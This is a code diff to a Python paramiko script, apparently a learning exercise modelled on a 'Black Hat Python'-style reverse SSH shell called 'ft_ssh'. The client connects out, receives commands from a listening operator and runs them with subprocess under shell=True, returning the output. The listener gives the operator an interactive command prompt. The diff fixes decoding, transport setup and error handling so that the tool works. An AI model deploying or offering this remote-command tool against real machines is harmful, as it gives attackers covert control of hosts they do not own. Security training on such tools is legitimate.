@@ -14,13 +14,15 @@ def ssh_command(ip, user, passwd, cmd, _port=22):
 		ssh_session = ssh_client.get_transport().open_session()
 		if ssh_session.active:
 			ssh_session.send(cmd)
-			print(ssh_session.recv(1024).decode())
+			# print(ssh_session.recv(1024).decode())
+			print(ssh_session.recv(1024))
 		# stdin, stdout, stderr = ssh_client.exec_command(cmd)
 		# print(stdout.read().decode())
 		while True:
-			cmd = ssh_session.recv(1024).decode()
+			# cmd = ssh_session.recv(1024).decode()
+			cmd = ssh_session.recv(1024)
 			try:
-				cmd_output = subprocess.check_output(cmd, shell=True)
+				cmd_output = subprocess.check_output(cmd.decode(), shell=True)
 				ssh_session.send(cmd_output)
 			except Exception:
 				ssh_session.send(str(Exception))
@@ -51,12 +53,12 @@ if __name__ == "__main__":
 		sock.listen(10)
 		print("[+] Listening for connection...")
 		client, addr = sock.accept()
-	except Exception:
-		print("[-] Listen failed")
+	except Exception as e:
+		print("[-] Listen failed: "+ str(e))
 		sys.exit(1)
 	print("[+] Got a connection")
 	try:
-		bhSession = paramiko.Transport(ssh_client) #to verify
+		bhSession = paramiko.Transport(client) #to verify
 		bhSession.add_server_key(host_key)
 		server = Server()
 		try:
@@ -69,10 +71,10 @@ if __name__ == "__main__":
 		chan.send("Welcome to ft_ssh")
 		while True:
 			try:
-				cmd = raw_input("Enter command: ").strip('\n') # to verify
+				cmd = input("Enter command: ").strip('\n') # to verify
 				if cmd != "exit":
 					chan.send(cmd)
-					print(chan.recv(1024).decode())
+					print(chan.recv(1024).decode(errors="ignore") + "\n")
 				else:
 					chan.send("exit")
 					print("exiting")
@@ -80,10 +82,8 @@ if __name__ == "__main__":
 					raise Exception("exit")
 			except KeyboardInterrupt:
 				bhSession.close()
-			except Exception:
-				print("[-] caught exception")
-				try:
-					bhSession.close()
-				except:
-					pass
-				sys.exit(1)
+			except Exception as e:
+				print("[-] caught exception: " + str(e))
+				bhSession.close()
+	finally:
+		sys.exit(1)
